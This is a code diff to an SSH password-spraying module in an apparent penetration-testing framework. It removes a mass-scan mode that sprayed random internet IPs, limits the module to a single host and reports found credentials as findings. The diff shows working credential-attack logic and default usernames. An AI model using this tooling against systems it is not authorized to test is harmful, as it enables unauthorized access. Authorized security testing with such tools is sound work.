@@ -26,8 +26,8 @@ use tokio::{
 };
 use ipnetwork::IpNetwork;
 
+use crate::module::{Finding, FindingKind, ModuleCtx, ModuleOutcome};
 use crate::utils::{cfg_prompt_yes_no, cfg_prompt_default, cfg_prompt_required};
-use crate::utils::{is_mass_scan_target, run_mass_scan, MassScanConfig};
 
 pub fn info() -> crate::module_info::ModuleInfo {
     crate::module_info::ModuleInfo {
@@ -175,29 +175,26 @@ fn parse_targets(spec: &str, port: u16) -> Vec<(String, u16)> {
         }
         
         // Try CIDR
-        if s.contains('/') {
-            if let Ok(network) = s.parse::<IpNetwork>() {
+        if s.contains('/')
+            && let Ok(network) = s.parse::<IpNetwork>() {
                 for ip in network.iter().take(65536) {
                     targets.push((ip.to_string(), port));
                 }
                 continue;
             }
-        }
         
         // Try IP range (e.g., 192.168.1.1-254)
         if s.contains('-') && s.contains('.') {
             let parts: Vec<&str> = s.rsplitn(2, '.').collect();
-            if parts.len() == 2 {
-                if let Some((start_str, end_str)) = parts[0].split_once('-') {
-                    if let (Ok(start), Ok(end)) = (start_str.parse::<u8>(), end_str.parse::<u8>()) {
+            if parts.len() == 2
+                && let Some((start_str, end_str)) = parts[0].split_once('-')
+                    && let (Ok(start), Ok(end)) = (start_str.parse::<u8>(), end_str.parse::<u8>()) {
                         let base = parts[1];
                         for i in start..=end {
                             targets.push((format!("{}.{}", base, i), port));
                         }
                         continue;
                     }
-                }
-            }
         }
         
         // Single IP/hostname
@@ -392,54 +389,12 @@ const DEFAULT_USERNAMES: &[&str] = &[
 ];
 
 /// Main entry point
-pub async fn run(target: &str) -> Result<()> {
+pub async fn run(ctx: &ModuleCtx) -> Result<ModuleOutcome> {
+    let target = ctx
+        .target
+        .as_single()
+        .context("ssh_spray requires a single-host target")?;
     display_banner();
-
-    // Mass scan mode: random IPs or target file
-    if is_mass_scan_target(target) {
-        let password = cfg_prompt_required("password", "Password to spray").await?;
-        if password.is_empty() {
-            return Err(anyhow!("Password is required"));
-        }
-        let users_str = cfg_prompt_default("usernames", "Usernames (comma-separated)", "root,admin,ubuntu").await?;
-        let users: Vec<String> = users_str.split(',').map(|s| s.trim().to_string()).filter(|s| !s.is_empty()).collect();
-        let users = Arc::new(users);
-        let password = Arc::new(password);
-
-        return run_mass_scan(target, MassScanConfig {
-            protocol_name: "SSH Spray",
-            default_port: 22,
-            state_file: "ssh_sweep_mass_state.log",
-            default_output: "ssh_sweep_mass_results.txt",
-            default_concurrency: 200,
-        }, move |ip: std::net::IpAddr, port: u16| {
-            let users = users.clone();
-            let password = password.clone();
-            async move {
-                if !crate::utils::tcp_port_open(ip, port, std::time::Duration::from_secs(5)).await {
-                    return None;
-                }
-                let addr: std::net::SocketAddr = format!("{}:{}", ip, port).parse().ok()?;
-                for user in users.iter() {
-                    let tcp = crate::utils::blocking_tcp_connect(
-                        &addr,
-                        std::time::Duration::from_secs(10),
-                    ).ok()?;
-                    if let Err(e) = tcp.set_read_timeout(Some(std::time::Duration::from_secs(10))) { crate::meprintln!("[!] Socket option error: {}", e); }
-                    if let Err(e) = tcp.set_write_timeout(Some(std::time::Duration::from_secs(10))) { crate::meprintln!("[!] Socket option error: {}", e); }
-                    let mut sess = ssh2::Session::new().ok()?;
-                    sess.set_tcp_stream(tcp);
-                    if sess.handshake().is_err() { continue; }
-                    if sess.userauth_password(user, &password).is_ok() && sess.authenticated() {
-                        let msg = format!("{}:{}:{}:{}", ip, port, user, password);
-                        crate::mprintln!("\r{}", format!("[+] FOUND: {}", msg).green().bold());
-                        return Some(format!("{}\n", msg));
-                    }
-                }
-                None
-            }
-        }).await;
-    }
 
     // Get password to spray
     let password = cfg_prompt_required("password", "Password to spray").await?;
@@ -557,6 +512,23 @@ pub async fn run(target: &str) -> Result<()> {
     
     crate::mprintln!();
     crate::mprintln!("{}", format!("[*] Password spray complete. Found {} valid credentials.", results.len()).green());
-    
-    Ok(())
+
+    let mut outcome = ModuleOutcome::ok();
+    for r in &results {
+        outcome.findings.push(Finding {
+            target: r.host.clone(),
+            kind: FindingKind::Credential,
+            message: format!("SSH credential valid {}:{} on {}:{}", r.username, r.password, r.host, r.port),
+            data: Some(serde_json::json!({
+                "service": "ssh",
+                "port": r.port,
+                "username": r.username,
+                "password": r.password,
+            })),
+        });
+    }
+
+    Ok(outcome)
 }
+
+crate::register_native_module!(crate::module::Category::Creds, "generic/ssh_spray", native);
